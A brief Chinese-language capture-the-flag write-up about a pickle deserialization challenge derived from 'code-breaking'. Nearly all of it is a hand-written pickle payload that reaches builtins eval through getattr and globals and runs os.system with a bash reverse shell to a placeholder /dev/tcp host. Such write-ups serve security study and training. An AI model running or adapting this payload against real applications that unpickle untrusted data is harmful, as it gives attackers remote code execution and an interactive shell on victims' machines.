这题目就是把code-breaking的pickle code后半部分拎出来了,主要就是考察手写pickle code来达到反序列化多函数执行的效果

poc
```
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
cbuiltins
getattr
(g1
S'eval'
tR(S'__import__("os").system("bash -i >& /dev/tcp/xx.xx.xx.xx/xxxx 0>&1")'
tR.
```
